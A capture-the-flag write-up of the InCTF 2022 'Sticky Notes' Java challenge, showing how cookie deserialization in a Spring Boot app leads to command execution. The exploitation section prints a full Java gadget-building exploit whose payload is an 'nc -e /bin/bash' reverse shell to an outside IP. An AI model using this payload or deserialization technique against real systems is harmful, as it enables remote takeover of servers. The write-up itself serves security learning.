# Sticky Notes  

**category** : web\
**tag** : java, deserialization, reflection api\
**source** : [source with docker-compose.yml file](https://github.com/Ryn0K/CTF_Writeups/tree/master/inctf-2022-final/web/Sticky-notes/handout/Sticky_notes)

## Analysis : 

we have spring boot application , need to analyse the [.jar](https://github.com/Ryn0K/CTF_Writeups/blob/master/inctf-2022-final/web/Sticky-notes/handout/Sticky_notes/deployment/Sticky_notes.jar) file  at [https://jdec.app/](https://jdec.app/)

![img1](https://i.imgur.com/8cWS0oy.png)

At home.class we have all mappings to endpoints

```java
@GetMapping({"/"})
   public ModelAndView index() {
      ModelAndView modelAndView = new ModelAndView();
      modelAndView.setViewName("index");
      return modelAndView;
}

@GetMapping({"/add_notes"})
   public ModelAndView add_notes() {
      ModelAndView modelAndView = new ModelAndView();
      modelAndView.setViewName("addnote");
    return modelAndView;
}
```

![index](https://i.imgur.com/mciyqlM.png)

we can add notes
![addnotes](https://i.imgur.com/RJfgq5z.png)

```java
@PostMapping({"/add"})
   public String setCookie(HttpServletResponse response, final HttpServletRequest req) throws IOException {
      Sticky_note one = new Sticky_note(req.getParameter("note"), this.i);
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
      ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
      objectOutputStream.writeObject(one);
      objectOutputStream.close();
      String cookie_data = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
      Cookie cookie = new Cookie("notes" + this.i, cookie_data);
      ++this.i;
      response.addCookie(cookie);
      response.sendRedirect("/");
      return "note added";
   }

   @GetMapping({"/render"})
   public String readAllCookies(HttpServletRequest request) throws IOException, ClassNotFoundException, InterruptedException {
      String listString = "";
      Cookie[] cookies = request.getCookies();
      if (cookies != null) {
         new ArrayList();
         List<String> note_string = new ArrayList();
         List<String> values = (List)Arrays.stream(cookies).map((c) -> {
            return c.getValue();
         }).collect(Collectors.toList());

         for(int j = 0; j < values.size(); ++j) {
            if (((String)values.get(j)).indexOf("rO0") != -1) {
               byte[] decodedBytes = Base64.getDecoder().decode((String)values.get(j));
               ByteArrayInputStream ois = new ByteArrayInputStream(decodedBytes);
               ObjectInput in = new ObjectInputStream(ois);
               Sticky_note result = (Sticky_note)in.readObject();
               result.inv();
               note_string.add(result.get_notes());
            }
         }

         String s;
         for(Iterator var11 = note_string.iterator(); var11.hasNext(); listString = listString + s + ";") {
            s = (String)var11.next();
         }
      }

      return listString;
}
```

so notes added to cookies in base64 by **serializing** the Sticky_note class

and `/render` deserializing them using  `readObject()`, so this is vulnerable to deserialization vulnerability.


## finding gadgets

```java
public class Sticky_note implements Serializable {
   private static final long serialVersionUID = 8997955967313857188L;
   private int id;
   private String notes;
   public Eval_util data;

   public Sticky_note(String note, int id) {
      this.notes = note;
      this.id = id;
   }

   public String get_notes() {
      return this.notes;
   }

// this one 
   public int inv() throws IOException, InterruptedException {
      if (this.data != null) {
         this.data.execute();
      }

      return 1;
   }
}
```

`Sticky_note` having function `inv()` which of type `Eval_util` and 

```java
public class Eval_util implements Serializable {
   private static final long serialVersionUID = -8347155815694777921L;
   public String val;

   public int get_val() {
      return this.val.length();
   }

   public Object execute() throws IOException, InterruptedException {
      String[] cmd = new String[]{"/bin/sh", "-c", this.val};
      Runtime r = Runtime.getRuntime();
      r.exec(cmd);
      return null;
   }
}
```

we can execute `command` by chaining serializable payload to change `public String val`

and plus point here after deserializing the cookie in `/render`
it is automatically calling `inv()`.

```java
Sticky_note result = (Sticky_note)in.readObject();
result.inv(); //<<====================
note_string.add(result.get_notes());
```

## Exploitation

exploit [here](https://github.com/Ryn0K/CTF_Writeups/tree/master/inctf-2022-final/web/Sticky-notes/Exploit)

i am using `reflection api` here, so reader should read that first cause i am not going detail overhere.

[exploit.java](https://github.com/Ryn0K/CTF_Writeups/blob/master/inctf-2022-final/web/Sticky-notes/Exploit/exploit.java)

```java
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import com.example.demo.*;

class Main{
    public static void main(String[] args) throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException, IOException {
        com.example.demo.Eval_util evutil = new com.example.demo.Eval_util(); // object of Eval_util class
        Field val = com.example.demo.Eval_util.class.getDeclaredField("val"); // get field we want to write 
        val.setAccessible(true); // set accessible true
        val.set(evutil,new String("nc -e /bin/bash 117.242.246.138 8882")); // bind object and change value with command

        com.example.demo.Sticky_note stnote = new com.example.demo.Sticky_note("payload executed", 0); // get object of Sticky_note class
        Field data = com.example.demo.Sticky_note.class.getDeclaredField("data"); // get field data which of type Eval_util
        data.setAccessible(true);
        data.set(stnote,evutil); // bind

        // base64 format
        ByteArrayOutputStream objectBOS = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(objectBOS);
        out.writeObject(stnote);
        out.close();
        String payload = Base64.getEncoder().encodeToString(objectBOS.toByteArray());
        System.out.println(payload);
    }
}
```

- compile gadget classes first

![classes](https://i.imgur.com/fJ2ihfo.png)

- compile payload(exploit.java) and get payload

![exploit](https://i.imgur.com/288XH1H.png)


- send payload and get shell

![hurrey](https://i.imgur.com/7jw3n0o.png)

- Get flag

![flag](https://i.imgur.com/IwbfSdl.png)
